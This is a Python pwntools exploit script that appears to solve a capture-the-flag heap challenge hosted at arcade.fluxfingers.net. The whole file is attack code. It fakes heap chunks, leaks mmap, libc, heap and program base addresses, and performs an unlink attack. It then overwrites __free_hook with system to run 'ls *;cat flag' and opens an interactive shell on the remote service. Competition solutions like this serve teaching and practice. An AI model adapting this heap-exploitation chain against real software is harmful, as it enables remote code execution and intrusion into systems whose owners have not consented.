#!/usr/bin/env python
# coding: utf-8

from pwn import *

p = remote('arcade.fluxfingers.net', 1809)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_remote = {
	'base': 0x0,
	'unsorted_bin': 0x1beb00,
	'free_hook': 0x1c0748,
	'top_chunk': 0x1beb00,
	'system': 0x45380
}

libc = libc_remote

elf = {
	'base': 0x0, 
	'leaked': 0x1670,
	'mmaped': 0x4048
}

heap = {
	'base': 0x0,
	'leaked': 0x290,
	'ptr': 0x280
}

mmap = {
	'base': 0x0,
	'leaked': 0x880,
	'libc_ptr': 0x120 * 7 + 0x10
}

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base
	
def write(sz, offset, payload):
	ru('exit\n')
	sel('1')
	ru('write?\n')
	sel(str(sz & 0xFFFFFFFFFFFFFFFF))
	ru('offset?\n')
	sel(str(offset & 0xFFFFFFFFFFFFFFFF))
	if local:
		time.sleep(0.1)
	else:
		time.sleep(0.5)
	se(payload)

def free(offset):
	ru('exit\n')
	sel('3')
	ru('free?\n')
	sel(str(offset & 0xFFFFFFFFFFFFFFFF))

def leak(offset):
	ru('exit\n')
	sel('4')
	ru('leak?\n')
	sel(str(offset & 0xFFFFFFFFFFFFFFFF))

ru('Please')

payload = (p64(0) + p64(0x21) + 'A' * 0x10) * 8
write(len(payload), 0, payload)
for i in range(7):
	free(i * 0x20 + 0x10)

payload = (p64(0) + p64(0x31) + 'B' * 0x20) * 8
write(len(payload), 0, payload)
for i in range(7):
	free(i * 0x30 + 0x10)

payload = (p64(0) + p64(0x21) + 'A' * 0x10) * 5
write(len(payload), 0x880, payload)
for i in range(4):
	free(0x880 + i * 0x20 + 0x10)

payload = (p64(0) + p64(0x31) + 'B' * 0x20) * 2
write(len(payload), 0x880, payload)
for i in range(2):
	free(0x880 + i * 0x30 + 0x10)

leak(0x8f0)
leaked = pick64(rud('\n'))
set_base(mmap, 'leaked', leaked)
print('[+] mmap base @ %#x' % mmap['base'])

payload = (p64(0) + p64(0x101) + 'C' * 0xf0 + p64(0) + p64(0x21) + 'D' * 0x10) * 3
write(len(payload), 0, payload)
write(len(payload), 0+len(payload), payload)
write(len(payload), 0+len(payload)*2, payload)
for i in range(8):
	free(i * 0x120 + 0x10)

write(8, 0, p64(mmap['libc_ptr']+1))
leak(0)
leaked = pick64('\0' + rud('\n'))
set_base(libc, 'unsorted_bin', leaked)
print('[+] libc base @ %#x' % libc['base'])

write(8, 0, p64(libc['top_chunk']))
leak(0)
leaked = pick64(rud('\n'))
set_base(heap, 'leaked', leaked)
print('[+] heap base @ %#x' % heap['base'])

write(8, 0, p64(heap['ptr']))
leak(0)
leaked = pick64(rud('\n'))
set_base(elf, 'leaked', leaked)
print('[+] elf base @ %#x' % elf['base'])

# Unlink
fd = elf['mmaped'] - 24
bk = elf['mmaped'] - 16

payload = p64(0) + p64(0x101) + p64(fd) + p64(bk)
write(len(payload), 0, payload)
payload = p64(0x100) + p64(0x100) + 'C' * 0xf0 + p64(0) + p64(0x21) + 'D' * 0x10 + p64(0) + p64(0x21)
write(len(payload), 0x100, payload)

free(0x100 + 0x10)

write(8, 0x18, p64(libc['free_hook']))
payload = p64(libc['system']) + 'ls *;cat flag\0'
write(len(payload), 0, payload)

free(0x8)

p.interactive()
